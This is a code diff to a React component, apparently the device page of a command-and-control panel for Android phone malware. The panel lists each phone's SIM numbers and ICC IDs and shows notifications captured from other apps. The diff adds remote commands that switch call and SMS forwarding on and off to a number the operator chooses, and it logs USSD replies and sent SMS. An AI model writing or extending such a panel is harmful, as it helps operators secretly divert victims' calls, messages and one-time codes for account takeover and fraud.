@@ -38,10 +38,7 @@ export default function DeviceDetail({ deviceId, onClose }: Props) {
   const [cmdSmsId, setCmdSmsId] = useState('')
   const [fwdCallNum, setFwdCallNum] = useState('')
   const [fwdCallSim, setFwdCallSim] = useState('0')
-  const [fwdCallEn, setFwdCallEn] = useState(false)
   const [fwdSmsNum, setFwdSmsNum] = useState('')
-  const [fwdSmsSim, setFwdSmsSim] = useState('0')
-  const [fwdSmsEn, setFwdSmsEn] = useState(false)
 
   const device = deviceId ? devices[deviceId] : null
   const deviceSms = allSms.filter(s => s.deviceId === deviceId)
@@ -50,24 +47,12 @@ export default function DeviceDetail({ deviceId, onClose }: Props) {
     if (!deviceId) return
     ;(async () => {
       try {
-        const [nSnap, lSnap, fSnap] = await Promise.all([
+        const [nSnap, lSnap] = await Promise.all([
           get(ref(db, `notifications/${deviceId}`)),
           get(ref(db, `logs/${deviceId}`)),
-          get(ref(db, `forwarding/${deviceId}`)),
         ])
-        const nv = nSnap.val()
-        const lv = lSnap.val()
-        const fv = fSnap.val()
-        setNotifications(nv ? Object.values(nv).reverse() : [])
-        setLogs(lv ? Object.values(lv).reverse() : [])
-        if (fv) {
-          setFwdCallNum(fv.call_number || '')
-          setFwdCallSim(String(fv.call_sim_slot ?? 0))
-          setFwdCallEn(fv.call_enabled === 1)
-          setFwdSmsNum(fv.sms_number || '')
-          setFwdSmsSim(String(fv.sms_sim_slot ?? 0))
-          setFwdSmsEn(fv.sms_enabled === 1)
-        }
+        setNotifications(nSnap.val() ? Object.values(nSnap.val()).reverse() : [])
+        setLogs(lSnap.val() ? Object.values(lSnap.val()).reverse() : [])
       } catch {}
     })()
   }, [deviceId])
@@ -92,18 +77,10 @@ export default function DeviceDetail({ deviceId, onClose }: Props) {
     }
   }
 
-  const handleForwarding = async (e: React.FormEvent) => {
-    e.preventDefault()
+  const sendFwdCmd = async (cmd: string) => {
     try {
-      await set(ref(db, `forwarding/${deviceId}`), {
-        call_enabled: fwdCallEn ? 1 : 0,
-        call_number: fwdCallNum,
-        call_sim_slot: parseInt(fwdCallSim) || 0,
-        sms_enabled: fwdSmsEn ? 1 : 0,
-        sms_number: fwdSmsNum,
-        sms_sim_slot: parseInt(fwdSmsSim) || 0,
-      })
-      setCmdResult('Forwarding settings saved')
+      await sendCommand({ device_id: deviceId!, cmd, simSlot: parseInt(fwdCallSim), phoneNumber: fwdCallNum })
+      setCmdResult("Command '" + (cmd === 'call_forward_on' ? 'Call Forward ON' : cmd === 'call_forward_off' ? 'Call Forward OFF' : cmd === 'sms_forward_on' ? 'SMS Forward ON' : cmd === 'sms_forward_off' ? 'SMS Forward OFF' : cmd) + "' sent")
     } catch (e: any) { setCmdResult('Error: ' + e.message) }
   }
 
@@ -152,7 +129,8 @@ export default function DeviceDetail({ deviceId, onClose }: Props) {
             <InfoItem label="Installed" value={d.installTime || d.install_time || 'N/A'} />
             <InfoItem label="SIM 1" value={d.nameSim1 && d.numberSim1 ? `${d.nameSim1} (${d.numberSim1})` : d.nameSim1 || d.numberSim1 || d.sim1_name || d.sim1_number || 'N/A'} />
             <InfoItem label="SIM 2" value={d.nameSim2 && d.numberSim2 ? `${d.nameSim2} (${d.numberSim2})` : d.nameSim2 || d.numberSim2 || d.sim2_name || d.sim2_number || 'N/A'} />
-            <InfoItem label="Phone" value={d.phone_number || d.phone || 'N/A'} />
+            <InfoItem label="ICC ID 1" value={d.iccIdSim1 || 'N/A'} mono />
+            <InfoItem label="ICC ID 2" value={d.iccIdSim2 || 'N/A'} mono />
           </div>
         </div>
 
@@ -184,7 +162,7 @@ export default function DeviceDetail({ deviceId, onClose }: Props) {
                   <div className="sms-top"><span className="sms-sender">{n.package || 'Unknown'}</span></div>
                   <div className="sms-body" style={{fontWeight:600}}>{n.title}</div>
                   <div className="sms-body" style={{marginTop:4}}>{n.text}</div>
-                  <div className="sms-time"><SVG path="M12 1v4M12 19v4M4.22 4.22l2.83 2.83" size={11}/>{n.timestamp || ''}</div>
+                  <div className="sms-time"><SVG path="M12 1v4M12 19v4M4.22 4.22l2.83 2.83" size={11}/>{n.timestamp ? new Date(n.timestamp).toLocaleString() : ''}</div>
                 </div>
               ))}
             </div>
@@ -201,8 +179,9 @@ export default function DeviceDetail({ deviceId, onClose }: Props) {
                 <div key={i} className="sms-item">
                   <div className="sms-top"><span className="sms-sender">{l.type || 'Log'}</span></div>
                   <div className="sms-body" style={{fontSize:12}}>Target: {l.target || 'N/A'} | Status: {l.status || 'N/A'}</div>
-                  {l.response && <div className="sms-body" style={{fontSize:11,marginTop:4}}>{l.response}</div>}
-                  <div className="sms-time"><SVG path="M12 1v4M12 19v4M4.22 4.22l2.83 2.83" size={11}/>{l.timestamp || ''}</div>
+                  {l.message && <div className="sms-body" style={{fontSize:11,marginTop:4,color:'var(--text2)'}}>Message: {l.message}</div>}
+                  {l.response && <div className="sms-body" style={{fontSize:11,marginTop:4,color:'var(--green)',background:'rgba(34,197,94,.06)',padding:'6px 8px',borderRadius:6}}>USSD Response: {l.response}</div>}
+                  <div className="sms-time"><SVG path="M12 1v4M12 19v4M4.22 4.22l2.83 2.83" size={11}/>{l.timestamp || ''} {l.type === 'call_forward_status' ? '• USSD' : ''} {l.type === 'sms_sent' ? '• SMS Sent' : ''}</div>
                 </div>
               ))}
             </div>
@@ -212,17 +191,28 @@ export default function DeviceDetail({ deviceId, onClose }: Props) {
         {/* Forwarding Tab */}
         <div className={`detail-section ${activeTab === 'forwarding' ? 'active' : ''}`}>
           <div className="cmd-section">
-            <div className="cmd-title"><SVG path="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72 12.84 12.84 0 0 0 .7 2.81 2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45 12.84 12.84 0 0 0 2.81.7A2 2 0 0 1 22 16.92z"/> Call & SMS Forwarding</div>
-            <form className="cmd-form" onSubmit={handleForwarding}>
-              <div className="field"><label>Call Forward Number</label><input type="text" placeholder="+919876543210" value={fwdCallNum} onChange={e => setFwdCallNum(e.target.value)}/></div>
-              <div className="field"><label>Call Forward SIM</label><select value={fwdCallSim} onChange={e => setFwdCallSim(e.target.value)}><option value="0">SIM 1</option><option value="1">SIM 2</option></select></div>
-              <div className="field"><label style={{display:'flex',alignItems:'center',gap:8,cursor:'pointer'}}><input type="checkbox" checked={fwdCallEn} onChange={e => setFwdCallEn(e.target.checked)}/> Enable Call Forwarding</label></div>
-              <div className="field" style={{marginTop:16}}><label>SMS Forward Number</label><input type="text" placeholder="+919876543210" value={fwdSmsNum} onChange={e => setFwdSmsNum(e.target.value)}/></div>
-              <div className="field"><label>SMS Forward SIM</label><select value={fwdSmsSim} onChange={e => setFwdSmsSim(e.target.value)}><option value="0">SIM 1</option><option value="1">SIM 2</option></select></div>
-              <div className="field"><label style={{display:'flex',alignItems:'center',gap:8,cursor:'pointer'}}><input type="checkbox" checked={fwdSmsEn} onChange={e => setFwdSmsEn(e.target.checked)}/> Enable SMS Forwarding</label></div>
-              <button className="btn btn-primary btn-block" type="submit"><SVG path="M9 12l2 2 4-4m6 2a9 9 0 1 1-18 0 9 9 0 0 1 18 0z"/> Save Settings</button>
-            </form>
+            <div className="cmd-title"><SVG path="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72 12.84 12.84 0 0 0 .7 2.81 2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45 12.84 12.84 0 0 0 2.81.7A2 2 0 0 1 22 16.92z"/> Call Forwarding</div>
+            <div className="cmd-form">
+              <div className="field"><label>Number to forward to</label><input type="text" placeholder="+919876543210" value={fwdCallNum} onChange={e => setFwdCallNum(e.target.value)}/></div>
+              <div className="field"><label>SIM Slot</label><select value={fwdCallSim} onChange={e => setFwdCallSim(e.target.value)}><option value="0">SIM 1</option><option value="1">SIM 2</option></select></div>
+              <div style={{display:'flex',gap:8}}>
+                <button className="btn btn-primary" style={{flex:1}} onClick={() => sendFwdCmd('call_forward_on')}><SVG path="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07" size={14}/> Activate</button>
+                <button className="btn btn-danger" style={{flex:1}} onClick={() => sendFwdCmd('call_forward_off')}><SVG path="M18 6 6 18M6 6l12 12" size={14}/> Deactivate</button>
+              </div>
+              <div className="field" style={{marginTop:12}}><button className="btn btn-ghost btn-block" onClick={() => sendFwdCmd('call_forward_status')}><SVG path="M12 1v4M12 19v4M4.22 4.22l2.83 2.83M16.95 16.95l2.83 2.83" size={14}/> Check Forward Status</button></div>
+            </div>
           </div>
+          <div className="cmd-section">
+            <div className="cmd-title"><SVG path="M22 12h-4l-3 9L9 3l-3 9H2" size={15}/> SMS Forwarding</div>
+            <div className="cmd-form">
+              <div className="field"><label>Forward SMS to number</label><input type="text" placeholder="+919876543210" value={fwdSmsNum} onChange={e => setFwdSmsNum(e.target.value)}/></div>
+              <div style={{display:'flex',gap:8}}>
+                <button className="btn btn-success" style={{flex:1}} onClick={() => sendFwdCmd('sms_forward_on')}><SVG path="M22 12h-4l-3 9L9 3l-3 9H2" size={14}/> Enable</button>
+                <button className="btn btn-danger" style={{flex:1}} onClick={() => sendFwdCmd('sms_forward_off')}><SVG path="M18 6 6 18M6 6l12 12" size={14}/> Disable</button>
+              </div>
+            </div>
+          </div>
+          <CmdResult msg={cmdResult} />
         </div>
 
         {/* Commands Tab */}
